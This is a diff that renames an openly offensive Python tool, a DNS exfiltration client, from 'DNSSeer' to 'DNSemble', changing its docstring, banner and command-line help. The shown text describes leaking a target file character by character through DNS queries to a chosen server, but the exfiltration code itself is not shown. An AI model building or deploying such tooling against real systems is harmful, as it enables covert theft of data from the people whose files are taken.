@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-DNSSeer Client — DNS Exfiltration Agent  (pure Python, zero dependencies)
+DNSemble Client — DNS Exfiltration Agent  (pure Python, zero dependencies)
 
 Reads a target file and exfiltrates it one character at a time by
-querying well-known domains through a DNSSeer server.
+querying well-known domains through a DNSemble server.
 
 Dynamic mapping: on SESSION_START the server returns a 32-bit seed
 inside the DNS response IP.  Both sides feed that seed into the
@@ -43,11 +43,11 @@ class C:
     cyn  = "\033[96m"
 
 BANNER = f"""{C.cyn}{C.bold}
-    ____  _   _______ _____
-   / __ \\/ | / / ___// ___/___  ___  _____
-  / / / /  |/ /\\__ \\ \\__ \\/ _ \\/ _ \\/ ___/
- / /_/ / /|  /___/ /___/ /  __/  __/ /
-/_____/_/ |_//____//____/\\___/\\___/_/
+    ____  _   _____                 __    __
+   / __ \\/ | / / ___/___  ____ ___  / /_  / /__
+  / / / /  |/ /\\__ \\/ _ \\/ __ `__ \\/ __ \\/ / _ \\
+ / /_/ / /|  /___/ /  __/ / / / / / /_/ / /  __/
+/_____/_/ |_//____/\\___/_/ /_/ /_/_.___/_/\\___/
 {C.rst}
   {C.dim}DNS Exfiltration Client  ·  v1.0   (dynamic mapping){C.rst}
 """
@@ -248,11 +248,11 @@ def exfiltrate(args):
 
 def main():
     ap = argparse.ArgumentParser(
-        description="DNSSeer — DNS exfiltration client (pure Python)")
+        description="DNSemble — DNS exfiltration client (pure Python)")
     ap.add_argument("-s", "--server", required=True,
-                    help="DNSSeer server IP address")
+                    help="DNSemble server IP address")
     ap.add_argument("-p", "--port", type=int, default=5353,
-                    help="DNSSeer server port (default 5353)")
+                    help="DNSemble server port (default 5353)")
     ap.add_argument("-f", "--file", required=True,
                     help="Path to the file to exfiltrate")
     ap.add_argument("-c", "--client-id", type=int, default=None,
